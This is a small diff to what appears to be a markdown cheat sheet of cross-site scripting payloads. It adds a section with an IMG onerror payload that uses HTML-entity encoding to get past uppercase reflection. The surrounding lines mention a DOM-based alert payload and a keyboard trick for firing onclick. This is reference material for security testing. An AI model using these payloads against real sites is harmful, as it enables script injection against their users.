@@ -260,6 +260,12 @@ e.g: 14.rs/#alert(document.domain)
 Use CTRL+SHIFT+X to trigger the onclick event
 ```
 
+### XSS when payload is reflected capitalized
+
+```javascript
+<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
+```
+
 ### DOM based XSS
 
 Based on a DOM XSS sink.
